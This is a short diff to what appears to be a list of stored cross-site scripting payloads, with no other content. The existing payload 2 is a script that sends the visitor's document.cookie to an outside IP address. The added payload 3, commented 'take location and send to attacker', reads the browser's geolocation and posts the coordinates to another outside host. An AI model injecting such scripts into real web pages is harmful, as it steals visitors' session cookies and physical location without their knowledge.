@@ -7,3 +7,8 @@ Stored:
 2.
   <script>$.ajax({type: 'POST', data: JSON.stringify({userInfo: document.cookie}), contentType: 'application/json', url: 'http://192.168.0.103:8085/stored'});</script>
   //TAKE NOTE: IP ADDRESS IN THE URL IS DYNAMIC
+
+3. //TAKE LOCATION AND SEND TO ATTACKER
+<script>navigator.geolocation.getCurrentPosition (function (position) { $.ajax({type: 'POST', data: JSON.stringify({userLocation: {lat: position.coords.latitude, lon: position.coords.longitude}}), contentType: 'application/json', url: 'http://10.12.14.44:8085/reflected'}); });</script>
+
+
